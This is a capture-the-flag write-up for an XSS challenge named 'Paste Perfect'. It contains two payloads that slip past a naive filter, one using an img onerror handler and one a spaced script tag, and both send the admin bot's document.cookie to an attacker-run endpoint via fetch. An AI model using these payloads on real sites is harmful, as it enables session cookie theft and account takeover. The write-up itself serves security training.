# Paste Perfect

Creator: Antti Ellilä

XSS with just a tiny bit of naive restrictions.

## Solution

Figure out from the code that the admin that checks reported pastes has a flag in it's cookies.

Create a web endpoint to receive requests on, for example [Request Catcher](https://requestcatcher.com/) or [Webhook.site](https://webhook.site/)

Bypass the simple XSS protections with something like
`<img src="" onerror="fetch('my url', { headers: { cookies: document.cookie }})">`
or even just a script tag with a space
```html
<script >
fetch('my url', { headers: { cookies: document.cookie }})
</script >
```

Create a paste with such content and press the report button.
